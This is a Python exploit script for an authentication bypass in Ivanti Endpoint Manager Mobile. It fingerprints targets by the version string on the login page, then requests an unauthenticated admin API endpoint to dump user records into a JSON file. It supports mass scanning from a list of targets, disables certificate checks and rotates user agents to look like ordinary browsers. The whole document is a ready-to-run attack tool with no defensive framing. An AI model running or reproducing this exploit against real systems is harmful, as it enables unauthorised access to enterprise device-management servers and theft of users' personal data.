from colorama import Fore
import requests
import json
import random
import urllib3
import argparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = f"""
{Fore.WHITE}
 ██▓ ██▒   █▓ ▄▄▄       ███▄    █ ▄▄▄█████▓ ██▓    ██▓███   ▒█████   ▄████▄  
▓██▒▓██░   █▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▓██▒   ▓██░  ██▒▒██▒  ██▒▒██▀ ▀█  
▒██▒ ▓██  █▒░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██▒   ▓██░ ██▓▒▒██░  ██▒▒▓█    ▄ 
░██░  ▒██ █░░░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ░██░   ▒██▄█▓▒ ▒▒██   ██░▒▓▓▄ ▄██▒
░██░   ▒▀█░   ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░██░   ▒██▒ ░  ░░ ████▓▒░▒ ▓███▀ ░
░▓     ░ ▐░   ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░▓     ▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░
 ▒ ░   ░ ░░    ▒   ▒▒ ░░ ░░   ░ ▒░    ░     ▒ ░   ░▒ ░       ░ ▒ ▒░   ░  ▒   
 ▒ ░     ░░    ░   ▒      ░   ░ ░   ░       ▒ ░   ░░       ░ ░ ░ ▒  ░        
 ░        ░        ░  ░         ░           ░                  ░ ░  ░ ░      
         ░                                                          ░      
{Fore.RESET}
Author: {Fore.CYAN}c0d3Ninja{Fore.RESET}
Desc: {Fore.CYAN}Authentication bypass in Ivanti Endpoint Manager Mobile{Fore.RESET}

"""

print(banner)

parser = argparse.ArgumentParser()

parser.add_argument('-t', '--target',
                   help="target to scan")

parser.add_argument('-f', '--file',
                   help="file to scan")

args = parser.parse_args()

useragent_list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36"
]

header = {"User-Agent": random.choice(useragent_list)}

def get_version(url: str) -> str:
    try:
        s = requests.Session()
        r = s.get(url, verify=False, headers=header)
        if r.status_code == 200:
            start = r.text.find("ui.login.css?")
            if start != -1:
                end = r.text.find('"', start)
                version = r.text[start + len("ui.login.css?"):end]
                if version <= "11.4":
                    url = url.replace("https://", "")
                    print(f"{Fore.GREEN}[+] {Fore.CYAN}{url}{Fore.WHITE} might be vulnerable!\n")
                    return True
                else:
                    print(f"{Fore.RED}[-] {Fore.CYAN}{url}{Fore.RED} is not vulnerable!\n")
                    return False
    except requests.exceptions.ConnectionError:
        print(f"Connection error from {Fore.GREEN}{url}\n")

def PoC(url: str) -> str:
    try:
        print(f"Exploiting {Fore.GREEN}{url}\n")
        s = requests.Session()
        r = s.get(f"{url}/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1", verify=False, headers=header)
        if r.status_code == 200:
            json_data = r.json()
            url = url.replace("https://", "")
            with open(f"{url}.json", "w") as json_file:
                json_file.write(json.dumps(json_data, indent=4))
            print(f"Target {Fore.GREEN}{url} {Fore.WHITE}Exploited!\n")
        else:
            print(f"{Fore.RED}Target {Fore.GREEN}{url} {Fore.WHITE}Could not be Exploited{Fore.RESET}!\n")
    except requests.exceptions.ConnectionError:
        print(f"Connection error from {Fore.GREEN}{url}\n")            

if args.target:
    check_target = get_version(args.target)
    if check_target:
        PoC(args.target)
    else:
        pass

if args.file:
    with open(args.file, "r") as f:
        targets = [x.strip() for x in f.readlines()]
        for target_list in targets:
            target_list = f"https://{target_list}"
            check_target = get_version(target_list)
            if check_target:
                PoC(target_list)
            else:
                pass
